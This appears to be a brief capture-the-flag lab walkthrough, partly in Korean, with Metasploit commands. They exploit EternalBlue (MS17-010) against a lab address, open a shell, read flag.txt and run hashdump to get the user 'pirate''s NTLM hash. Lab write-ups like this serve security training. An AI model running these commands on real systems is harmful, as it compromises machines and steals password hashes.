use use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.10
set rport 445
exploit

# meterpreter -> cmd : change to interactable shell with native command

shell

# etc

cd
dir
pwd
search -f flag.txt
type flag.txt

![](https://velog.velcdn.com/images/agnusdei1207/post/841b2d11-69ad-4a2c-b3e6-1dcfe22a113e/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/af142867-ed28-4348-9802-09e0fb636536/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/e74d0066-fe70-4808-b11e-c441694f304f/image.png)
What is the content of the flag.txt file?

![](https://velog.velcdn.com/images/agnusdei1207/post/bee7be2c-3990-444c-a2c2-63c32c46b790/image.png)
What is the NTLM hash of the password of the user "pirate"?

# hash 는 meterpeter 커맨드에서 바로 실행하기

hashdump
meterpeter> hashdump
